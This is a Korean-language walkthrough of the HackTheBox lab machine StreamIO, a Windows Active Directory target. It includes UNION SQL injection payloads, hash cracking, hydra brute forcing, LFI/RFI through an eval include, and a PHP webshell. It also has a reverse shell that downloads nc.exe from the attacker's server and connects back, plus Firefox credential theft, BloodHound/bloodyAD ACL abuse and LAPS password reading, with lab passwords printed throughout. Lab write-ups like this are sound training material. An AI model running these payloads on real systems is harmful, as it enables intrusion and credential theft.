# HTB-STREAMIO
```bash
OS: Windows(AD)
DATE: 26.10.13
DIFFICULTY: Medium
```

## RECON
**nmap**: 열거를 위해 포트 검사를 진행하였다. 먼저 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9289 | tee NMAP
```
포트 검사 결과 88, 389, 445 포트 등이 있는 것으로 보아 Windows의 AD 서버인 것 같았다. 따라서 먼저 nxc의 smb 기능으로 guest 유저 등으로 접속할 수 있는지 확인해보았다
```bash
nxc smb IP -u '' -p '' --share
```
도메인 주소는 알게 되었지만 게스트 접속이 안 되는 것 같았다. 그럼에도 불구하고 user 목록을 뽑는 users 옵션과 rid-brute 옵션을 실행해보았다
```bash
nxc smb IP -u '' -p '' --users
```
```bash
nxc smb IP -u '' -p '' --rid-brute
```
하지만 여전히 불가능하여 다른 서비스에 접근해보았다. 먼저 ldap으로 ldap 정보를 뒤져보려고 하였다. 그리고 user도 뽑아보았다
```bash
nxc ldap streamIO.htb -u '' -p '' --users
```
```bash
ldapsearch -x -H ldap://IP  -b "DC=streamIO,DC=htb"  
```
하지만 여전히 아무것도 발견할 수 없어 http 서비스에 접근해보았다. 접근 결과 IIS 서비스만 있어 웹 디렉토리 fuzzing과 서브도메인 fuzzing을 진행하였다
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://IP -H "Host:FUZZ.streamIO.htb"
```
http 또한 알 수 있는 정보가 없어 마지막으로 443 https 서비스에 접근하였다. 접근 결과 접근이 불가능하다 하여 nmap을 다시 한 번 확인해본 결과
```bash
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-10-15T12:51:44+00:00; +7h00m05s from scanner time.
```
이와 같이 `streamIO.htb`와 `watch.streamIO.htb` 도메인을 추가해줘야 작동한다는 것을 알게 되었다. 따라서 나온 도메인을 모두 저장해주고 다시 한 번 `streamIO.htb`에 접근한 결과 **Streamio**라는 movie stream을 하는 플랫폼 같았다. 이후 서브도메인 watch 또한 접속한 결과 서브도메인 또한 영화 관련 사이트였다. 따라서 두 도메인 모두 fuzzing을 진행해주었다
```bash
ffuf -u https://streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u https://streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000s.txt -u http://streamIO.htb -H "Host:FUZZ.streamIO.htb"
```
먼저 메인 도메인 fuzzing 결과 특별한 것 없이 **admin**이라는 403 상태 코드가 뜨는 페이지가 있다는 것을 알게 되어, 확장자를 추가해준 후 다시 한 번 더 실행해보았다
```bash
ffuf -u https://streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -e .php,.txt
```
그 결과 logout, login, register 등등 로그인할 수 있는 페이지가 있다는 것을 알게 되었다. 이후 이와 같이 서브도메인 페이지도 fuzzing을 진행하였다
```bash
ffuf -u https://watch.streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -u https://watch.streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -u https://watch.streamIO.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -e .php,.txt
```
fuzzing 결과 `search.php`, `blocked.php`라는 숨겨진 두 페이지를 찾을 수 있었다

## Initial Access
초기 침투를 위해 처음 열거했던 https://streamIO.htb 부터 접근하였다. 먼저 회원가입 후 로그인을 시도하였지만 불가능하였다. 이후 다른 폼에서 SQLI, XSS 취약점 페이로드를 실행하였지만 알 수 있는 것이 없었다. 따라서 `https://watch.streamIO.htb/` 페이지에 접근하였다. 아까 fuzzing을 통해 알게 된 search.php 페이지부터 접근해보았다. 안에는 말 그대로 영화들을 검색할 수 있는 페이지가 있었다. 그리고 blocked.php도 접근한 결과 `Malicious Activity detected!! Session Blocked for 5 minutes`라는 문구가 있는 페이지였다. 따라서 메인 도메인과 같이 search.php에 SQLI 페이로드를 시도한 결과 영화 검색이 아니라 blocked.php로 간다는 것을 알게 되었다. 따라서 UNION-based, 즉 결과가 페이지에 직접 출력되는 취약점인 것을 알게 되어 여러 페이로드를 실행하였다. 먼저 `aas' or 1=1--`와 같은 페이로드가 성공하여, 이후 컬럼을 찾기 위해 `union select` 명령어를 사용하였다
```sql
' union select 1--
' union select 1,2--
' union select 1,2,3--
' union select 1,2,3,4--
' union select 1,2,3,4,5--
' union select 1,2,3,4,5,6--
```
페이로드 결과 6번째에서 2, 3 숫자가 떠서 컬럼 수는 6개인 것을 알게 되었다. 또한 컬럼이 2, 3에서 출력되는 것을 알게 되었다. 이제 본격적으로 DB를 추출해보았다. 먼저 DB 종류 및 버전을 확인하기 위해 2번 컬럼에 **@@version**을 넣어 확인해주었다
```sql
' union select 1,@@version,3,4,5,6--

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor) 
```
그 결과 MSSQL Server라는 것을 알게 되었다. 이후 데이터베이스 목록을 확인하기 위해 master..sysdatabases 명령어로 데이터 목록을 출력하였다
```sql
' union select 1,name,3,4,5,6 FROM master..sysdatabases--
```
DB 목록 출력 결과 `master, model, msdb, STREAMIO, streamio_backup` 등등을 확인할 수 있었다. 따라서 STREAMIO DB를 대상으로 테이블 목록을 확인하였다
```sql
' UNION SELECT 1,table_name,3,4,5,6 FROM STREAMIO.information_schema.tables--
```
그 결과 `users, movie`라는 두 테이블을 알 수 있었다. 따라서 다음으로 컬럼 목록을 출력하였다
```sql 
` union select 1,column_name,3,4,5,6 from STREAMIO.information_schema.columns WHERE table_name='users'--
```
실행 결과 id, is_staff, password, username 컬럼이 있다는 것을 알게 되었다. 따라서 알게 된 컬럼 데이터를 추출해주었다
```sql
' UNION SELECT 1,username,3,4,5,6 FROM streamio_backup..users--
' UNION SELECT 1,2,password,4,5,6 FROM streamio_backup..users--
```
그 결과 여러 유저들의 패스워드 해시와 이름을 얻게 되었다. 따라서 모든 username과 password를 `USER:PASS` 형식으로 파일로 저장해준 후 **cut** 명령어로 username 파일과 password 파일을 만들어주었다
```bash
cut -d':' -f1 resulte > users.txt
```
```bash
cut -d':' -f2 resulte > pass.txt
```
이후 MD5 해시라는 것을 확인한 후 hashcat을 돌려주었다
```bash
hashcat -m 0 pass.txt /usr/share/wordlists/rockyou.txt
```
```bash
hashcat -m 0 pass.txt /usr/share/wordlists/rockyou.txt --show
```
그 결과 모든 유저의 비번을 뚫지는 못했지만 많은 유저들의 credential을 얻게 되었다. 따라서 모두 user2, pass2로 옮겨준 후 nxc bruteforce 기능을 사용하여 smb 유저가 있는지 확인해주었다. 또한 --no-brute 옵션을 사용하여 유저명과 비밀번호를 일치하게 하였다
```bash
nxc smb IP -u user2 -p pass2 --continue-on-success --no-brute
```
하지만 아무도 맞는 비밀번호가 없었다. 따라서 hydra를 사용하여 아까 https의 로그인 서비스 brute force를 진행하였다
```bash
hydra -L users.txt -P pass.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```
그 결과 **yoshihide**라는 유저의 크레덴셜을 얻을 수 있었다. 따라서 대상 유저로 https 서비스에 접속해보았다. 로그인 후 아까 접속하지 못하였던 admin 페이지에 접속한 후 admin 페이지도 FUZZING을 실행하였다
```bash
https://streamio.htb/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r -e .php,.txt
```
FUZZING 결과 master.php라는 중요한 파일을 알게 되었다. 파일을 들어가보았다. 하지만 별 내용을 발견할 순 없었다. 따라서 그냥 /admin 페이지에 들어가보았다. 접속 결과 `user, staff, movie`와 같은 페이지를 누르면 **/?staff=** 파라미터 형식으로 바뀌었다. 따라서 바로 LFI를 시도해보았다. 하지만 아무것도 얻지 못하여 FUZZING을 진행하였다
```bash
ffuf -u https://streamio.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -r
```
fuzzing 결과 **debug**라는 숨겨져 있는 파라미터를 알게 되었다. 따라서 debug 파라미터 안에 아까 발견한 master.php를 사용해본 결과 LFI 취약점이 있다는 것을 확정 지을 수 있었다. 이후 애플리케이션의 소스코드를 읽기 위해 `php://filter`를 사용하였다
```HTML
?debug=php://filter/convert.base64-encode/resource=master.php
```
따라서 base64로 인코딩된 소스코드를 얻을 수 있었고, 이것을 디코딩한 결과 평문 `master.php` 소스코드를 얻었다. 하지만 이 페이지에는 master.php 파일만 있는 것이 아니기에 index.php도 이와 같이 인코딩된 base64 소스코드를 얻고 디코딩해주었다. 그 결과
```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
```
index.php에서 DB의 크레덴셜을 얻을 수 있었고
```php
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
이후 master.php 소스코드를 확인해본 결과 숨겨진 include 파라미터를 발견할 수 있었고, include라는 POST 값이 들어오면, 그리고 include 값이 index.php만 아니라면 **eval**이라는 함수, 즉 php 코드로 실행하라는 명령어가 있었다. 따라서 RFI 취약점이 있을 수 있다고 판단하였다. 왜냐하면 include 안에 내 url 주소를 넣어 `eval(file_get_contents("http://IP:9999/revshell.php"))` 이렇게 실행하기에, 접속해서 파일을 가져가고 실행할 수 있는 것이었다. 이제 실행하기 위해서 `/admin/master.php`로 실행하였지만 불가능하였다. 따라서 더 소스코드를 확인해본 결과
```php
<?php
if(!defined('included'))
	die("Only accessable through includes");
```
이 뜻은 오직 include를 통해서만 접근이 가능하다고 적혀 있었다. 따라서 `?debug=` 파라미터를 이용해야 RFI가 가능하다고 판단하였다. 따라서 다시 한 번 시도하였다. 먼저 webshell php 파일을 만들어준 후 서버에 POST해보았다
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
```bash
python3 -m http.server 9999
```
이렇게 세팅을 해준 후 burp를 통해 실행해보았다
```html
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=0k3g5kqejtudqkq1ao0o2g3uv7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

include=http://IP:9999/shell.php
```
그 결과 python3 서버에서 분명 shell.php 파일을 가져간 것까지는 떴다. 즉 RFI가 가능하다는 것이다. 하지만 무슨 이유인지 모르겠지만 404 코드가 떴다. 따라서 밑에 내용도 추가로 확인해보았다
```python
python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
10.129.85.59 - - [19/Oct/2026 12:01:17] code 404, message File not found
10.129.85.59 - - [19/Oct/2026 12:01:17] "GET /shell.php__ HTTP/1.0" 404 -
```
그 결과 나는 shell.php를 업로드하였지만 서버는 shell.php__를 찾고 있어서 404 오류가 뜨는 것이었다. 따라서 `?`를 파일명 뒤에 붙여 `__`를 쿼리 형태로 바꿔주었더니 정상적으로 shell.php 파일을 서버가 받아서 실행할 수 있게 되었다
```python
10.129.85.59 - - [19/Oct/2026 12:06:38] "GET /shell.php?__ HTTP/1.0" 200 -
```
따라서 RFI를 확정 지을 수 있게 되어 리버스 쉘 파일을 만들어주었다. 계획은 이러했다. 먼저 윈도우 OS이기 때문에 powershell의 wget을 이용하여 내 서버에서 nc.exe 파일을 먼저 다운로드해준 후, nc를 통해 접속할 수 있도록 내 IP와 연결을 시켜주는 것이다. 따라서 먼저 첫 번째 줄에 nc.exe 다운로드 코드를 짜주었다
```php
system("powershell -c wget IP:9999/nc.exe -outfile nc.exe");
```
이후 두 번째 줄에 nc.exe -e powershell 옵션, 즉 파워쉘로 실행해서 연결하라는 옵션을 붙여 내가 오픈하고 있는 4444 포트로 연결되게 하였다
```php
system("nc.exe -e powershell IP 4444");
```
이렇게 두 줄의 php 코드를 작성한 후 rev.php에 저장하여, 아까와 같이 ?를 추가해준 후 POST 해주었다
```html
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=0k3g5kqejtudqkq1ao0o2g3uv7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

include=http://IP:9999/rev.php?
```
그 결과 yoshihide 쉘을 얻을 수 있었다

## Privilege Escalation
yoshihide 쉘을 얻었지만 권한이 매우 낮은 쉘이라서 권한 상승이 필요했다. 따라서 아까 얻었던 DB 접속 크레덴셜을 사용해서 DB에 접속해보았다. 먼저 윈도우이기 때문에 **sqlcmd** 명령어를 사용해주었다. 대상 tool은 MSSQL 데이터베이스에 명령줄로 접속하는 도구였다. 따라서 실행해주었다
```sql
sqlcmd -S localhost -U db_admin -P B1@hx31234567890
```
하지만 대화형 커맨드가 불가능하였다. 따라서 쿼리 형태로 시도하였다
```sql
sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -Q "SELECT name FROM sys.databases;"
```
그 결과 DB를 볼 수 있었다. 아까 SQLI를 통해 알 수 있었던 DB 종류들이 있었지만, 아까 시도해보지 못한 `streamio_backup`을 살펴보았다
```sql
sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -d streamio_backup -Q "SELECT table_name FROM information_schema.tables;"
```
그 결과 users 테이블을 볼 수 있었다. 따라서 users의 모든 내용을 출력해보았다
```sql
sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -d streamio_backup -Q "SELECT * FROM users;"

id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
          3 James                                              c660060492d9edcaa8332d89c99c9239
          4 Theodore                                           925e5408ecb67aea449373d668b7359e
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5
```
그 결과 다시 한 번 더 유저들과 유저 password hash를 얻어주었다. 대상 내용을 모두 USER:HASH 형태로 userhash 파일에 저장해준 후 cut을 사용하여 user3 파일과 pass3 파일로 나눠주었다
```bash
cut -d':' -f1 userhash > user3
cut -d':' -f2 userhash > pass3
```
따라서 pass3 파일 안에 있는 hash를 hashcat mode 0, 즉 md5로 크랙해주었다
```bash
hashcat -m 0 pass3 /usr/share/wordlists/rockyou.txt
```
하지만 pass3 파일에 공백이 있어 크랙이 불가능하여 공백 제거를 사용해주었다
```bash
sed -i 's/[[:space:]]//g' pass3
```
그리고 다시 한 번 더 돌려주었다
```bash
hashcat -m 0 pass3 /usr/share/wordlists/rockyou.txt
```
```bash
hashcat -m 0 pass3 /usr/share/wordlists/rockyou.txt --show

389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
그 결과 여러 해시 비번이 크랙되었고, 대상 패스워드 주인 이름만 또 걸러주어 최종 4명의 크레덴셜이 생겼다. 이것을 nxc를 사용하여 맞는 유저가 있는지 확인해주었다
```bash
nxc smb IP -u user3 -p pass3 --no-brute --continue-on-success
```
그 결과 nikk37라는 유저를 알게 되었고 winrm 접근도 확인해본 결과 접속할 수 있었다. 따라서 유저 쉘을 얻을 수 있게 되었다

![user](attach_real/Pasted%20image%2020261016103104.png)

이후 대상 유저 크레덴셜을 사용하여 bloodhound를 돌려주었다
```bash
bloodhound-python -u nikk37 -p 'get_dem_girls2@yahoo.com' -d streamIO.htb -ns IP  -c all
```
```bash
bloodhound-start
```
이후 `cypher` 탭에서 Shortest Paths to Domain Admins를 확인해주었다. 확인 결과 JDGODD라는 유저로 권한 상승이 가능하다는 것을 알게 되었다

![bloodhound](attach_real/Pasted%20image%2020261019125012.png)

이후 nikk37 유저에서 권한 상승 경로를 찾아보았다. 따라서 WINPEAS를 사용한 결과 firefox DB라는 이름의 경로가 나왔다. `C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\` 따라서 더 찾아본 결과 Firefox 크레덴셜을 털 수 있는 것이었다. 따라서 폴더 안에 있는 key4.db를 download하여 로컬에서 확인해본 결과 암호화가 되어 있었다. 따라서 이 암호를 크랙할 수 있는 것을 찾아본 결과 [firefox_decrypt.py](https://github.com/lclevy/firepwd) 도구를 사용하여 key4.db와 logins.json 파일을 이용하여 크랙할 수 있다는 것을 알게 되었다. 따라서 두 파일을 로컬로 가지고 와서 크랙해주었다
```python
python firepwd.py -d mozilla_db

ttps://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
그 결과 또 다른 유저들의 평문 패스워드를 알게 되었다. 따라서 대상 크레덴셜을 user4, pass4 형태로 저장해준 후 nxc를 돌려보았다
```bash
nxc smb IP -u user4 -p pass4 --no-brute --continue-on-success
```
시도한 결과 아무도 맞는 크레덴셜이 없었다. 따라서 다시 확인해본 결과 admin 이름에 JD로 시작하는 패스워드가 있었다. 따라서 JDgodd 유저의 패스워드일 수 있다는 생각에 다시 한 번 시도해보았다
```bash
nxc smb IP -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
```
그 결과 맞는 비밀번호를 얻게 되었다. 하지만 winrm은 접속이 불가능하였다. 따라서 아까 bloodhound에서 볼 수 있었던 권한 상승 경로를 이용하기로 하였다. 하지만 쉘이 없다는 생각에 처음에 무조건 쉘을 얻으려고 하였지만, 툴들은 쉘이 없어도 자격증명만으로 가능하다는 것을 알게 되었다. 먼저 `Core STAFF`라는 그룹과 **OWN** 관계라는 것을 알게 되어 WriteOwner 권한을 써서 Core Staff의 소유자를 JDgodd로 만들었다
```bash
bloodyAD -H IP -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' set owner 'core staff' JDgodd
```
이후 소유자가 됐으니 권한을 추가해주었다. 즉 그룹을 완전히 제어할 권한 GenericAll을 부여해주었다
```bash
bloodyAD -H IP -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll 'core staff' JDgodd
```
이후 그룹에 JDgodd를 멤버로 추가해주었다
```bash
bloodyAD -H IP -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'core staff' JDgodd
```
여기까지가 첫 번째 단계, core staff 그룹에 속한 것이다. 이후 core staff 그룹은 **ReadLAPSPassword**가 가능한 그룹이기에 laps를 읽어주었다
```bash
bloodyAD -H IP -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' get object DC --attr ms-Mcs-AdmPwd
```
그 결과 admin의 평문 비번을 얻게 되었고, 접속하여 admin 쉘을 최종적으로 얻을 수 있게 되었다

![admin](attach_real/Pasted%20image%2020261016194537.png)


## New Inform
- 항상 403이어도 주시하자. 특히 admin
- windows 서버여도 웹 서버는 php일 수 있음
- 항상 sqli를 실행해보자
- UNION-based, 즉 결과가 화면에 출력되는 SQLI는 결과가 출력되는 페이지가 union이 통하는 단계이다
- union based가 나오면 먼저 1. injection 포인트를 확인해준다 ex) ';-- 2. 컬럼 개수 찾기: ' order by 또는 union select로 숫자가 뜰 때까지 숫자를 늘린다 3. 버전 확인 4. 데이터베이스 목록 확인 5. 테이블 목록 또한 추출 6. 컬럼 목록 추출 7. 데이터 추출. 이때 ..처럼 점이 두 개인 이유는 스키마 때문에 비워둔다
- nxc에서 패스워드와 유저 이름을 똑같이 정렬해서 하고 싶으면 --no-brute를 사용한다
- hydra에서 https면 form만 바꿔준다
- 무조건 새로운 페이지에 들어오면 FUZZING을 진행한다. like /admin
- 무조건 **/?staff=**와 같이 url 파라미터에 적을 수 있는 형태면 무조건 바로 LFI를 생각하고 시도해야 한다
- /?staff= 형식은 서버가 내부적으로 어떤 파일을 부른다는 뜻이기에 검사할 수 있다
- 또한 LFI 취약점이 있을 것 같은데 나오지 않는다면 무조건 FUZZING을 진행한다. like burp-parameter-names.txt
- LFI 의심 지점에 항상 뭐든 시도해본다. 특히 파일명 index.php, 다른 페이지
- LFI 취약점을 확인 후 php://filter로 소스코드를 확인하자. 안 될 수도 있음. 래퍼가 막혀 있으면 안 됨
- 항상 LFI든 뭐든 파일을 넣을 때 대상 파일만 넣지 말고 기본 페이지 index.php 등등도 확인하자. 무조건 index.php부터 뽑는 게 상식
- 항상 소스코드를 꼼꼼히 읽고 취약점 찾기
- eval = php 코드로 실행하라는 뜻
- 소스코드 안에 include를 통해서만 접속하라고 하면 파라미터 접속을 떠올리자
- debug 파라미터가 include하는 통로
- include를 해야지만 실행될 수 있는 코드도 있다
- 만약 POST가 안 되고 서버가 내 파일을 가져가지 않으면 Content-Type을 확인하자
- RFI에서 서버가 파일까지 잘 가져가는데 404가 뜨면 파일명을 확인하자
- 만약 서버가 파일명 + __ 이런 형태라면 ?를 붙여서 쿼리스트링으로 만들어주자
- 윈도우 리버스 쉘 방법 중 nc.exe를 쉘에 저장, 그리고 오픈 후 연결하는 방법이 있다
- sqlcmd는 윈도우에서 MSSQL에 명령줄로 접속하는 클라이언트 도구다 (sqlmap 같은 자동화 공격 도구와는 다름)
- 일반 유저가 볼 수 있는 DB 테이블이 있고, 특정 권한 유저만 볼 수 있는 table이 있다
- 공백이 있으면 hashcat 사용이 불가능. `sed -i 's/[[:space:]]//g' user2`으로 공백을 제거하자. 확인은 `awk '{print length": "$0}' user2`
- bloodhound에서 꼭 AD Shortest Paths를 찾자
- 항상 winpeas를 잘 확인하자. firefox 비번 크랙 잘 배움
- 라벨을 곧이곧대로 믿으면 안 됨. 뒤죽박죽일 수 있음. 무조건 --no-brute를 사용해야 한다는 생각은 버리자
- 쉘이 없어도 자격증명으로 권한 상승 가능
- bloodhound에서 사용하라는 툴은 안 될 수 있다
- 권한 상승 할 때 bloodyAD는 거의 모든 것이 가능함